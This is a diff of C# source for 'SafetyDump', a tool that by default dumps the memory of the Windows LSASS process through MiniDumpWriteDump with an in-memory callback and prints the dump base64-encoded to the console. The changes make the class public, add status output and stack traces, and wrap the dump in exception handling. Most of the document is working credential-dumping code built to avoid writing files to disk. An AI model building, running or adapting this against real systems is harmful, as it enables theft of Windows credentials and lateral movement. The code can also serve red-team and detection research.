@@ -2,6 +2,7 @@
 using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Text;
+using System.Linq.Expressions;
 
 /*
  * SafetyDump is an in-memory process memory dumper.
@@ -22,9 +23,9 @@ using System.Text;
  */
 namespace SafetyDump
 {
-    internal static class Program
+    public class Program
     {
-        
+
         private static void Minidump(int pid = -1)
         {
             IntPtr targetProcessHandle;
@@ -33,6 +34,7 @@ namespace SafetyDump
             Process targetProcess = null;
             if (pid == -1)
             {
+                Console.WriteLine("[*] Dumping LSASS memory");
                 var processes = Process.GetProcessesByName("lsass");
                 targetProcess = processes[0];
             }
@@ -44,73 +46,88 @@ namespace SafetyDump
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine($"\n[-]Exception: {e.Message}\n");
+                    Console.WriteLine($"\n[-] {e.Message}\n{e.StackTrace}");
                     return;
                 }
             }
 
             try
             {
-                targetProcessId = (uint) targetProcess.Id;
+                Console.WriteLine($"[*] Dumping {targetProcess.ProcessName} memory");
+                targetProcessId = (uint)targetProcess.Id;
                 targetProcessHandle = targetProcess.Handle;
             }
             catch (Exception e)
             {
-                Console.WriteLine($"\n[-] Error getting handle to {targetProcess.ProcessName} ({targetProcess.Id}): {e.Message}\n");
+                Console.WriteLine($"\n[-] Error getting handle to {targetProcess.ProcessName} ({targetProcess.Id}):\n");
+                Console.WriteLine($"\n[-] {e.Message}\n{e.StackTrace}");
                 return;
             }
-            
-            var byteArray = new byte[60 * 1024 * 1024];
-            var callbackPtr = new Internals.MinidumpCallbackRoutine((param, input, output) =>
-            {
-                var inputStruct = Marshal.PtrToStructure<Internals.MINIDUMP_CALLBACK_INPUT>(input);
-                var outputStruct = Marshal.PtrToStructure<Internals.MINIDUMP_CALLBACK_OUTPUT>(output);
-                switch (inputStruct.CallbackType)
+
+            try
+            { 
+
+
+                var byteArray = new byte[60 * 1024 * 1024];
+                var callbackPtr = new Internals.MinidumpCallbackRoutine((param, input, output) =>
                 {
-                    case Internals.MINIDUMP_CALLBACK_TYPE.IoStartCallback:
-                        outputStruct.status = Internals.HRESULT.S_FALSE;
-                        Marshal.StructureToPtr(outputStruct, output, true);
-                        return true;
-                    case Internals.MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback:
-                        var ioStruct = inputStruct.Io;
-                        if ((int)ioStruct.Offset + ioStruct.BufferBytes >= byteArray.Length)
-                        {
-                           Array.Resize(ref byteArray, byteArray.Length * 2); 
-                        }
-                        Marshal.Copy(ioStruct.Buffer, byteArray, (int)ioStruct.Offset, ioStruct.BufferBytes);
-                        outputStruct.status = Internals.HRESULT.S_OK;
-                        Marshal.StructureToPtr(outputStruct, output, true);
-                        return true;
-                    case Internals.MINIDUMP_CALLBACK_TYPE.IoFinishCallback:
-                        outputStruct.status = Internals.HRESULT.S_OK;
-                        Marshal.StructureToPtr(outputStruct, output, true);
-                        return true;
-                    default:
-                        return true;
+                    var inputStruct = new Internals.MINIDUMP_CALLBACK_INPUT();
+                    Marshal.PtrToStructure(input, inputStruct);
+                    var outputStruct = new Internals.MINIDUMP_CALLBACK_OUTPUT();
+                    Marshal.PtrToStructure(output, outputStruct);
+                    switch (inputStruct.CallbackType)
+                    {
+                        case Internals.MINIDUMP_CALLBACK_TYPE.IoStartCallback:
+                            outputStruct.status = Internals.HRESULT.S_FALSE;
+                            Marshal.StructureToPtr(outputStruct, output, true);
+                            return true;
+                        case Internals.MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback:
+                            var ioStruct = inputStruct.Io;
+                            if ((int)ioStruct.Offset + ioStruct.BufferBytes >= byteArray.Length)
+                            {
+                                Array.Resize(ref byteArray, byteArray.Length * 2);
+                            }
+                            Marshal.Copy(ioStruct.Buffer, byteArray, (int)ioStruct.Offset, ioStruct.BufferBytes);
+                            outputStruct.status = Internals.HRESULT.S_OK;
+                            Marshal.StructureToPtr(outputStruct, output, true);
+                            return true;
+                        case Internals.MINIDUMP_CALLBACK_TYPE.IoFinishCallback:
+                            outputStruct.status = Internals.HRESULT.S_OK;
+                            Marshal.StructureToPtr(outputStruct, output, true);
+                            return true;
+                        default:
+                            return true;
+                    }
+                });
+
+                var callbackInfo = new Internals.MINIDUMP_CALLBACK_INFORMATION
+                {
+                    CallbackRoutine = callbackPtr, CallbackParam = IntPtr.Zero
+                };
+
+                var size = Marshal.SizeOf(callbackInfo);
+                var callbackInfoPtr = Marshal.AllocHGlobal(size);
+                Marshal.StructureToPtr(callbackInfo, callbackInfoPtr, false);
+
+                if (Internals.MiniDumpWriteDump(targetProcessHandle, targetProcessId, IntPtr.Zero, (uint)2, IntPtr.Zero, IntPtr.Zero, callbackInfoPtr))
+                {
+                    Console.OutputEncoding = Encoding.UTF8;
+                    Console.Write(Convert.ToBase64String((byteArray)));
+                    return;
+
                 }
-            });
-
-            var callbackInfo = new Internals.MINIDUMP_CALLBACK_INFORMATION
-            {
-                CallbackRoutine = callbackPtr, CallbackParam = IntPtr.Zero
-            };
-
-            var size = Marshal.SizeOf(callbackInfo);
-            var callbackInfoPtr = Marshal.AllocHGlobal(size);
-            Marshal.StructureToPtr(callbackInfo, callbackInfoPtr, false);
-
-            if (Internals.MiniDumpWriteDump(targetProcessHandle, targetProcessId, IntPtr.Zero,(uint) 2, IntPtr.Zero, IntPtr.Zero, callbackInfoPtr))
-            {
-                Console.OutputEncoding = Encoding.UTF8;
-                Console.Write(Convert.ToBase64String((byteArray)));
-                return;
-    
+                Console.WriteLine("[-] Dump failed");
+                Console.WriteLine(Marshal.GetLastWin32Error());
             }
-            Console.WriteLine("[-] Dump failed");
-            Console.WriteLine(Marshal.GetLastWin32Error());
+            catch  (Exception e)
+            {
+                Console.WriteLine("[-] Exception dumping process memory");
+                Console.WriteLine($"\n[-] {e.Message}\n{e.StackTrace}");
+            }
+
         }
     
-        private static void Main(string[] args)
+        public static void Main(string[] args)
         {
 
             if (args.Length == 0)
